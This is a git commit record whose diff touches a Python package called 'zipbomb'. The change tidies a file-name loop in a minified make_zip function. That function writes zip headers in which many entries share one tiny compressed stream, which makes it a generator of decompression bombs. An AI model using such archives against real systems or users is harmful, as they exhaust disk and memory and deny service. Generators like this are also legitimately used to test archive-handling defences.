05f0ea5ac6dd6ac335203f5a4923045b346cb35e
Elisha Hollander <just4now666666@gmail.com>
2022-02-28 21:34:25 +0200

    remove `break`

--- zipbomb/__init__.py
+++ zipbomb/__init__.py
@@ -12,8 +12,6 @@ def make_zip(f,num_files,compressed_size):
 	L=G(I,2*A+1)&A^A;J=f.write(F('<LHHHHHLLLHH',67324752,20,0,8,0,0,L,B,K,1,0)+b'0\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+b'\0'*(B-15)+b'`');M=J
 	for E in range(H):
 		A=[]
-		while True:
-			A.insert(0,b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'[E%36]);E=E//36-1
-			if E<0:break
+		while E>=0:A.insert(0,b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'[E%36]);E=E//36-1
 		N=bytes(A);J+=f.write(F('<LHHHHHHLLLHHHHHLL',33639248,20,20,0,8,0,0,L,B,K,len(N),0,0,0,0,0,0)+N)
 	f.write(F('<LHHHHLLH',101010256,0,0,H,H,J-M,M,0))
